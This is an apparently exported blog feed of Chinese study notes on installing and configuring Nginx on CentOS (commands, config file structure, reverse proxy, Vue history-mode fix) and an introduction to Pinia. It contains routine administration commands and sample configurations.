<h2 id="安装OpenSSL"><a href="#安装OpenSSL" class="headerlink" title="安装OpenSSL"></a>安装OpenSSL</h2><p>OpenSSL是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用<br>Nginx不仅支持http协议，还支持https（即在ssl协议上传输http），所以需要在Centos安装OpenSSL库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install -y openssl openssl-devel</span><br></pre></td></tr></table></figure>

<h1 id="引入Nginx"><a href="#引入Nginx" class="headerlink" title="引入Nginx"></a>引入Nginx</h1><h2 id="下载和安装"><a href="#下载和安装" class="headerlink" title="下载和安装"></a>下载和安装</h2><p>下载：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://nginx.org/download/nginx-[所需的版本].tar.gz </span><br></pre></td></tr></table></figure>

<p>解压并前往目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -zxvf nginx-[所需的版本].tar.gz</span><br><span class="line">cd nginx-[所需的版本]</span><br></pre></td></tr></table></figure>

<p>执行nginx-configure文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure>

<h2 id="make命令编译"><a href="#make命令编译" class="headerlink" title="make命令编译"></a>make命令编译</h2><p>nginx-configure执行完后，会出现一个MakeFile文件夹</p>
<p>make是一个命令工具，它解释Makefile中的指令（规则）</p>
<p>Makefile文件描述了整个工程所有文件的编译顺序、编译规则</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<h2 id="Nginx操作"><a href="#Nginx操作" class="headerlink" title="Nginx操作"></a>Nginx操作</h2><p>查询nginx安装目录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whereis nginx</span><br></pre></td></tr></table></figure>

<p>前往安装目录，进入sbin，执行nginx：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./nginx</span><br></pre></td></tr></table></figure>

<h1 id="yum-install-404解决方案"><a href="#yum-install-404解决方案" class="headerlink" title="yum install 404解决方案"></a>yum install 404解决方案</h1><p>进入配置文件内，删除所有的.repo文件（也可以备份）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入配置文件夹</span></span><br><span class="line">cd /etc/yum.repos.d/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">删除旧的配置文件</span></span><br><span class="line">rm *.repo</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输入“y”回车确认</span></span><br></pre></td></tr></table></figure>

<p>要用ls确保该目录下的.repo文件已完全删除</p>
<hr>
<p>下载可以用的.repo文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-[所需的版本].repo</span><br></pre></td></tr></table></figure>

<p>如果没有安装wget，也可以使用：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-[所需的版本].repo</span><br></pre></td></tr></table></figure>

<hr>
<p>运行 yum makecache 生成缓存：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx常用命令</title>
    <url>/web/study/Nginx/3.Nginx%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="配置Nginx环境变量"><a href="#配置Nginx环境变量" class="headerlink" title="配置Nginx环境变量"></a>配置Nginx环境变量</h1><ol>
<li><p>使用<code>whereis nginx</code>记住Nginx安装目录</p>
</li>
<li><p>前往根目录，进入etc文件夹</p>
</li>
<li><p>使用<code>vim profile</code>打开配置文件</p>
</li>
<li><p>添加环境变量（用<code>:</code>分隔每一个环境变量）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:[Nginx安装目录]/sbin</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果环境变量没有生效，使用<code>source profile</code>重置环境变量</p>
</li>
</ol>
<h1 id="Nginx常用命令"><a href="#Nginx常用命令" class="headerlink" title="Nginx常用命令"></a>Nginx常用命令</h1><p>查看nginx版本号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 简单款</span><br><span class="line">nginx -v</span><br><span class="line"># 详细款</span><br><span class="line">nginx -V</span><br></pre></td></tr></table></figure>

<hr>
<p>启动nginx：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure>

<hr>
<p>停止nginx：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 立即停止</span><br><span class="line">nginx -s stop</span><br><span class="line"># 优雅地关闭方式，Nginx会在退出前完成已经接受的请求处理</span><br><span class="line">nginx -s quit</span><br></pre></td></tr></table></figure>

<hr>
<p>重载nginx配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>

<hr>
<p>查看nginx进程（-ef是输出标准格式）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只查看Nginx进程，grep是文本搜索工具，在此用于搜索关键词nginx</span><br><span class="line">ps -ef | grep nginx</span><br><span class="line"># 查看所有Linux进程</span><br><span class="line">ps -ef</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx配置文件</title>
    <url>/web/study/Nginx/4.Nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="找到配置文件"><a href="#找到配置文件" class="headerlink" title="找到配置文件"></a>找到配置文件</h1><p>如果已配置好环境变量，可以检查Nginx配置文件是否存在语法错误：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure>

<p>输出中就包含了Nginx配置文件的路径<code>[Nginx根目录]/conf/nginx.conf</code></p>
<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p>Nginx配置文件模板（来自<a href="https://zhuanlan.zhihu.com/p/619165119">知乎专栏</a>）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 全局参数</span><br><span class="line">user nginx;              # 可以允运行Nginx服务的用户或用户组，此配置在windows上无效</span><br><span class="line">worker_processes auto;   # Nginx工作进程数，通常设置为CPU核数</span><br><span class="line">error_log /var/log/nginx/error.log warn;    # 错误日志路径和日志级别</span><br><span class="line">pid /run/nginx.pid;      # 进程PID保存路径</span><br><span class="line"></span><br><span class="line"># 定义事件模块</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;    # 每个工作进程最大并发连接数</span><br><span class="line">    use epoll;                  # 使用epoll网络模型，提高性能</span><br><span class="line">    multi_accept on;            # 开启支持多个连接同时建立</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 定义HTTP服务器模块</span><br><span class="line">http &#123;</span><br><span class="line">    # 缓存文件目录</span><br><span class="line">    client_body_temp_path /var/cache/nginx/client_temp;</span><br><span class="line">    proxy_temp_path /var/cache/nginx/proxy_temp;</span><br><span class="line">    fastcgi_temp_path /var/cache/nginx/fastcgi_temp;</span><br><span class="line"></span><br><span class="line">    # 定义日志格式，main是默认的日志格式</span><br><span class="line">    log_format main &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">        &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">        &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    # 默认访问日志保存路径和格式</span><br><span class="line">    access_log /var/log/nginx/access.log main;</span><br><span class="line"></span><br><span class="line">    # 定义MIME类型</span><br><span class="line">    include /etc/nginx/mime.types;</span><br><span class="line">    default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">    # 代理参数</span><br><span class="line">    proxy_connect_timeout 6s;       # 连接超时时间</span><br><span class="line">    proxy_send_timeout 10s;         # 发送超时时间</span><br><span class="line">    proxy_read_timeout 10s;         # 接收超时时间</span><br><span class="line">    proxy_buffer_size 16k;          # 缓冲区大小</span><br><span class="line">    proxy_buffers 4 32k;            # 缓冲区个数和大小</span><br><span class="line">    proxy_busy_buffers_size 64k;    # 忙碌缓冲区大小</span><br><span class="line">    proxy_temp_file_write_size 64k; # 代理临时文件写入大小</span><br><span class="line"></span><br><span class="line">    # 启用压缩，可以提高网站访问速度</span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_min_length 1k;                    # 最小压缩文件大小</span><br><span class="line">    gzip_types text/plain text/css application/json application/javascript application/xml;</span><br><span class="line"></span><br><span class="line">    # 定义HTTP服务器</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;              # 监听端口</span><br><span class="line"></span><br><span class="line">        server_name example.com;    # 域名</span><br><span class="line"></span><br><span class="line">        # 重定向到HTTPS，强制使用HTTPS访问</span><br><span class="line">        if ($scheme != &quot;https&quot;) &#123;</span><br><span class="line">            return 301 https://$server_name$request_uri;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # HTTPS服务器配置</span><br><span class="line">        ssl_certificate      /etc/nginx/ssl/server.crt;    # SSL证书路径</span><br><span class="line">        ssl_certificate_key  /etc/nginx/ssl/server.key;    # SSL私钥路径</span><br><span class="line"></span><br><span class="line">        # SSL会话缓存参数</span><br><span class="line">        ssl_session_cache shared:SSL:10m;</span><br><span class="line">        ssl_session_timeout 10m;</span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line">        ssl_ciphers ECDH+AESGCM:ECDH+AES256:ECDH+AES128:DH+3DES:!ADH:!AECDH:!MD5;</span><br><span class="line"></span><br><span class="line">        # 配置代理路径</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://localhost:8080;        # 转发请求的目标地址</span><br><span class="line">            proxy_set_header Host $host;             # 设置请求头中的Host字段</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">                            # 设置HTTP头中的X-Forwarded-For字段，表示客户端真实IP，多个IP用逗号隔开</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr; # 设置请求头中的X-Real-IP字段，表示客户端真实IP</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 配置静态文件访问路径</span><br><span class="line">        location /static/ &#123;</span><br><span class="line">            alias /path/to/static/files/;   # 静态文件的目录</span><br><span class="line">            expires 7d;                     # 静态文件缓存时间</span><br><span class="line">            add_header Pragma public;       # 添加HTTP响应头</span><br><span class="line">            add_header Cache-Control &quot;public, must-revalidate, proxy-revalidate&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 配置错误页面</span><br><span class="line">        error_page 404 /404.html;           # 404错误页</span><br><span class="line">        location = /404.html &#123;</span><br><span class="line">            internal;                       # 不接受外部访问</span><br><span class="line">            root /usr/share/nginx/html;     # 404错误页文件所在目录</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 配置重定向</span><br><span class="line">        location /old/ &#123;</span><br><span class="line">            rewrite ^/old/([^/]+) /new/$1 permanent;   # 将/old/xxx路径重定向为/new/xxx，返回301状态码</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 其他服务配置</span><br><span class="line">    # server &#123;</span><br><span class="line">    #     ...</span><br><span class="line">    # &#125;</span><br><span class="line"></span><br><span class="line">    # 配置TCP负载均衡</span><br><span class="line">    upstream backends &#123;</span><br><span class="line">        server backend1.example.com:8080 weight=5;  # 后端服务器地址和权重</span><br><span class="line">        server backend2.example.com:8080;</span><br><span class="line">        server backend3.example.com:8080 backup;   # 备用服务器</span><br><span class="line">        keepalive 16;                               # 连接池大小</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name example.com;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://backends;             # 负载均衡转发请求的目标地址</span><br><span class="line">            proxy_set_header Host $host;            # 设置请求头中的Host字段</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr; # 设置请求头中的X-Real-IP字段，表示客户端真实IP</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件一共由三部分组成，分别为全局块、events块和http块</p>
<p>在http块中，又包含http全局块和多个server块</p>
<p>每个server块中，可以包含server全局块和多个location块</p>
<p>在同一配置块中嵌套的配置块，各个之间不存在次序关系</p>
<h2 id="全局块"><a href="#全局块" class="headerlink" title="全局块"></a>全局块</h2><p>全局块是默认配置文件从开始到events块之间的一部分内容，主要设置一些影响Nginx服务器整体运行的配置指令，因此，这些指令的作用域是Nginx服务器全局</p>
<ul>
<li><code>user [user] [group]</code><ul>
<li>指定可以运行Nginx服务的用户和用户组</li>
<li>只能在全局块配置user指令</li>
<li>在Windows上不生效，会报错</li>
</ul>
</li>
<li><code>worker_processes [number|auto]</code>：Nginx进程数量worker_processes，如果设置为2，Nginx将会开启一个master进程和两个worker进程</li>
<li><code>pid [path]</code>：存放pid文件</li>
<li><code>error_log [path] [level];</code> <ul>
<li>全局错误日志类型</li>
<li>日志分为debug、info、warn、error四个级别</li>
</ul>
</li>
</ul>
<h2 id="events块"><a href="#events块" class="headerlink" title="events块"></a>events块</h2><p>events块主要影响Nginx服务器与用户的网络连接</p>
<p>常用到的设置包括是否开启对多worker process下的网络连接进行序列化，是否允许同时接收多个网络连接，选取哪种事件驱动模型处理连接请求，每个worker process可以同时支持的最大连接数等</p>
<ul>
<li><code>accept_mutex [on|off]</code><ul>
<li>默认开启，开启后，Nginx的多个worker将会以串行的方式来处理，只会有一个worker将会被唤起，其他的worker继续睡眠</li>
<li>如果不开启，将会造成惊群效应，多个worker会全部被唤起，但只有一个worker能获取新连接，其它的worker会重新进入休眠状态</li>
</ul>
</li>
<li><code>worker_connections [number]</code> ：单个进程最大连接数（最大连接数&#x3D;连接数+进程数）</li>
</ul>
<h2 id="http块"><a href="#http块" class="headerlink" title="http块"></a>http块</h2><p>http块是Nginx服务器配置中的重要部分，包含代理、缓存和日志定义等绝大多数功能甚至第三方模块的配置</p>
<ul>
<li><code>include [path]</code>：引入其他的配置文件</li>
<li><code>default_type [path]</code>：如果没设置Web程序，Nginx也没对应文件的扩展名，就用Nginx里默认的 default_type定义的处理方式</li>
<li><code>log_format [format] [content]</code> ：定义日志格式，只能在http块中进行配置</li>
<li><code>sendfile</code><ul>
<li>启用sendfile()系统调用替换read()和write()调用，减少系统上下文切换，提高性能</li>
<li>当Nginx是静态文件服务器时，能极大提高Nginx的性能表现</li>
</ul>
</li>
<li><code>keepalive_timeout</code><ul>
<li>KeepAlive的超时时间</li>
<li>HTTP有一个KeepAlive模式，它告诉webserver，在处理完一个请求后，保持这个TCP连接的打开状态</li>
<li>若接收到来自客户端的其它请求，服务端会利用这个未被关闭的连接，而不需要再建立一个新连接</li>
</ul>
</li>
<li><code>gzip [on|off]</code><ul>
<li>开启Gzip压缩功能</li>
<li>使网站的CSS、JS、XML、HTML文件在传输时进行压缩，提高访问速度，优化Nginx性能</li>
</ul>
</li>
</ul>
<h2 id="server块"><a href="#server块" class="headerlink" title="server块"></a>server块</h2><p>每一个http块都可以包含多个server块，而每个server块就相当于一台虚拟主机，它内部可有多台主机联合提供服务，一起对外提供在逻辑上关系密切的一组服务</p>
<ul>
<li><p><code>listen [url|port]</code>：监听端口，可以单独制定ip，单独指定端口或者同时指定ip和端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen 127.0.0.1:8000;  #只监听来自127.0.0.1这个IP，请求8000端口的请求</span><br><span class="line">listen 127.0.0.1; #只监听来自127.0.0.1这个IP，请求80端口的请求（不指定端口，默认80）</span><br><span class="line">listen 9999; #监听来自所有IP，请求9999端口的请求</span><br><span class="line">listen *:9999; #和上面效果一样</span><br><span class="line">listen localhost:8000; #和第一种效果一致</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>server_name [name]</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server_name  localhost;</span><br></pre></td></tr></table></figure>

<ul>
<li>服务名</li>
<li>Nginx允许一个虚拟主机有一个或多个名字，也可以使用通配符<code>*</code>设置虚拟主机的名字</li>
<li>支持ip、域名、通配符、正则等</li>
</ul>
</li>
</ul>
<h2 id="location块"><a href="#location块" class="headerlink" title="location块"></a>location块</h2><p>每个server块中可以包含多个location块，Nginx服务器在许多功能上的灵活性往往体现在location指令的配置中</p>
<h3 id="location指令"><a href="#location指令" class="headerlink" title="location指令"></a>location指令</h3><p>可分为以下3类：</p>
<ul>
<li>前缀字符串匹配<ul>
<li>精确匹配 <code>=</code></li>
<li>前缀匹配 <code>^~</code>（立刻停止后续的正则搜索）</li>
<li>按文件中顺序的正则匹配 <code>~</code>或<code>~*</code></li>
<li>匹配不带任何修饰的前缀匹配</li>
</ul>
</li>
<li>正则表达式匹配</li>
<li>用于内部跳转的命名location</li>
</ul>
<h3 id="location-root"><a href="#location-root" class="headerlink" title="location root"></a>location root</h3><p>root指定目录的上级目录，并且该上级目录要含有location指定名称的同名目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /img/ &#123;</span><br><span class="line">	# 访问/img/目录下的文件时，nginx会去/var/www/image/img/目录下找文件</span><br><span class="line">	root /var/www/image;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx反向代理</title>
    <url>/web/study/Nginx/5.Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h1><p>反向代理中的常用指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置被代理服务前地址，可以是主机名称或IP地址+端口号形式</span><br><span class="line">proxy_pass</span><br><span class="line">proxy_set_header</span><br></pre></td></tr></table></figure>

<p>例如代理到百度：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 访问/会转到百度</span><br><span class="line">location / &#123;</span><br><span class="line">   root   html;</span><br><span class="line">   index  index.html index.htm;</span><br><span class="line">   proxy_pass https://www.baidu.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="解决跨域"><a href="#解决跨域" class="headerlink" title="解决跨域"></a>解决跨域</h1><p>前端JS（8080端口）：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"> </span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;/api/portal/list&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">  xhr.<span class="property">onreadystatechange</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp;  xhr.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  xhr.<span class="title function_">send</span>(<span class="literal">null</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/portal/list&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="attr">code</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="attr">message</span>: <span class="string">&quot;omg&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">9000</span>,<span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>Nginx配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /api/ &#123;</span><br><span class="line">  proxy_pass http://localhost:9000/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样就能实现跨越，前端JS截取到&#x2F;api&#x2F;就会转发到<code>http://localhost:9000/</code></p>
<h1 id="proxy-set-header"><a href="#proxy-set-header" class="headerlink" title="proxy_set_header"></a>proxy_set_header</h1><p>更改Nginx服务器接收到的客户端请求的请求头信息，然后将新的请求头发送给代理的服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># X-Real-IP 客户端或上一级代理ip</span><br><span class="line">proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line"># X-Real-Port 客户端或上一级端口</span><br><span class="line">proxy_set_header X-Real-Port $remote_port;</span><br><span class="line"># X-Forwarded-For 包含了客户端和各级代理ip的完整ip链路</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br></pre></td></tr></table></figure>

<p>X-Real-IP是必需的，其他是可选填</p>
<p>当只存在一级Nginx代理时，X-Real-IP和X-Forwarded-For是一致的</p>
<p>$remote_addr是前一节点的IP，并不一定是用户的真实IP</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx-Vue-History-404问题</title>
    <url>/web/study/Nginx/6.Nginx-Vue-History-404%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="问题原因"><a href="#问题原因" class="headerlink" title="问题原因"></a>问题原因</h1><p>Nginx服务器根据页面路由，按路径寻找资源</p>
<p>打包好的Vue web站点只有一个html页面，不存在其他资源目录下的html，服务器找不到对应页面，所以才报404</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306281756301.png"></p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>在对应的代理规则中加入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 如果给出的file都没有匹配到，则重新请求最后一个参数给定的uri，就是新的location匹配</span><br><span class="line">try_files $uri $uri/ /index.html;</span><br></pre></td></tr></table></figure>

<h1 id="常见变量"><a href="#常见变量" class="headerlink" title="常见变量"></a>常见变量</h1><ul>
<li>$uri：当前请求的URI，但不含”?”后的参数</li>
<li>$args：当前请求的参数，即”?”后的宇符串</li>
<li>$arg_xxx：当前请求里的某个参数，”arg”后是参数的名字</li>
<li>$http_xxx：当前请求里的xxx头部对应的值</li>
<li>$sent_http_xxx：返回给客户端的响应头部对应的值</li>
<li>$remote_addr：客户端IP地址。</li>
<li>$http_cookie：获取cookie值</li>
<li>$cookie_xxx：当前请求的cookie xxx对应的值</li>
<li>$request_uri：浏览器发起的不作任何修改的请求的url中的path，如在<a href="http://www.baidu.com/p1/file?d=111">www.baidu.com/p1/file?d=111</a>, 其值为&#x2F;p1&#x2F;file?d&#x3D;111</li>
<li>$uri：当前的请求URI，不包括任何参数，反映任何内部重定向或index模块所做的修改</li>
<li>$request_method：请求方法</li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Pinia简介</title>
    <url>/web/study/Pinia/1.Pinia%E7%AE%80%E4%BB%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><p>Pinia是一个全局状态管理工具，<del>完爆了VueX</del>。<a href="https://pinia.vuejs.org/zh/">官网</a></p>
<ul>
<li>完整的Vue3+TS支持</li>
<li>足够轻量，压缩后的体积只有1kb左右</li>
<li>去除mutations。只有state、getters、actions</li>
<li>actions支持同步和异步</li>
<li>代码扁平化没有模块嵌套，只有store的概念；store之间可以自由使用，每一个store都是独立地</li>
<li>无需手动添加store，store一旦创建便会自动添加</li>
<li>支持Vue2和Vue3</li>
</ul>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>添加依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install pinia -s</span><br></pre></td></tr></table></figure>

<p>在main.ts中引入：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./style.css&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue2要这么写</span></span><br><span class="line"><span class="comment">// import &#123; createPinia, PiniaVuePlugin &#125; from &quot;pinia&quot; </span></span><br><span class="line"><span class="comment">// Vue.use(PiniaVuePlugin)</span></span><br><span class="line"><span class="comment">// const pinia = createPinia()</span></span><br><span class="line"><span class="comment">// new Vue(&#123;</span></span><br><span class="line"><span class="comment">//   el: &#x27;#app&#x27;,</span></span><br><span class="line"><span class="comment">//   // other options...</span></span><br><span class="line"><span class="comment">//   // ...</span></span><br><span class="line"><span class="comment">//   // note the same `pinia` instance can be used across multiple Vue apps on</span></span><br><span class="line"><span class="comment">//   // the same page</span></span><br><span class="line"><span class="comment">//   pinia,</span></span><br><span class="line"><span class="comment">// &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue3要这么写</span></span><br><span class="line"><span class="keyword">import</span> &#123; createPinia &#125; <span class="keyword">from</span> <span class="string">&quot;pinia&quot;</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="title function_">createPinia</span>()</span><br><span class="line"><span class="title function_">createApp</span>(<span class="title class_">App</span>).<span class="title function_">use</span>(store).<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Pinia</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx负载均衡</title>
    <url>/web/study/Nginx/8.Nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><p>upstream被包裹在http模块内，和server模块同级</p>
<p>一个upstream需要设置一个名称，这个名称可以在server里作proxy主机使用</p>
